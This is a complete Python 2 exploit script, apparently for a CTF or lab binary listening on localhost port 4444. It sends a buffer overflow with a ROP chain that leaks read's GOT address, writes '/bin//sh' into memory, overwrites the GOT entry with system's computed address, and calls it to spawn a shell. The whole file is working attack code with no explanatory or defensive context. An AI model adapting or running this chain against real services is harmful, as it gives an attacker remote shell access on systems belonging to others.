import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 4444))

#   Payload Start
readgot = 0x0804961c
writeplt = 0x0804830c

#   These 3 were defined only later
destination_buffer = 0x08049530 # the location of /bin//sh
readplt = 0x0804832c            # the location of readplt
gadget = 0x080484b6             # the location of PPPr
#

payload = "A"*140   #   Initializing Payload

#   Payload Start   (Part 1)    Finding value of read function
payload += struct.pack("<I", writeplt)
#   payload += struct.pack("<I", 0x41414141)
payload += struct.pack("<I", gadget)
payload += struct.pack("<I", 1)
payload += struct.pack("<I", readgot)
payload += struct.pack("<I", 4)
#   Payload End     (Part 1)

#   Payload Start   (Part 2)    Writing /bin//sh somewhere in the program
payload += struct.pack("<I", readplt)
payload += struct.pack("<I", gadget)
payload += struct.pack("<I", 0)
payload += struct.pack("<I", destination_buffer)
payload += struct.pack("<I", 4)
#

#   Payload Start   (Part 3)    Making of system call: Overwriting value at readgot with address of system function
payload += struct.pack("<I", readplt)
payload += struct.pack("<I", gadget)
payload += struct.pack("<I", 0)
payload += struct.pack("<I", readgot)
payload += struct.pack("<I", 4)
#

#   Payload Start   (Part 4)    Calling the modified readgot by read@plt
payload += struct.pack("<I", readplt)
payload += struct.pack("<I", 0x41414141)
payload += struct.pack("<I", destination_buffer)
#


#

#   Sending Payload
s.send(payload)
#

#    Receiving Payload
leak = struct.unpack("<I", s.recv(4))[0]
#   print hex(leak)
s.send("/bin//sh")

sys_addr = leak + 633824
sys_addr = struct.pack("<I", sys_addr)

s.send(sys_addr)
#
